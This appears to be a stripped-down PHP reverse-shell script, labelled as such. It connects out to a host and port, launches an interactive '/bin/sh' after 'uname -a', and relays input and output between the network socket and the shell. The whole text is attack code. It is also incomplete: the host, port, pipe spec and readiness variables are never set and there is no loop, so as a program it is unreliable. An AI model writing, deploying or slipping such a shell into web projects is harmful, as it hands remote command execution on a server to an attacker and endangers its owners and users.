<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
$unused = "/bin/sh -i";
$sock = fsockopen($host, $port);
$command = "uname -a; /bin/sh -i";
$child = proc_open($command, $spec, $pipes);
if ($ready) {
    $input = fread($sock, 4096);
    fwrite($pipes[0], $input);
}
if ($ready) {
    $input = fread($pipes[1], 4096);
    fwrite($sock, $input);
}
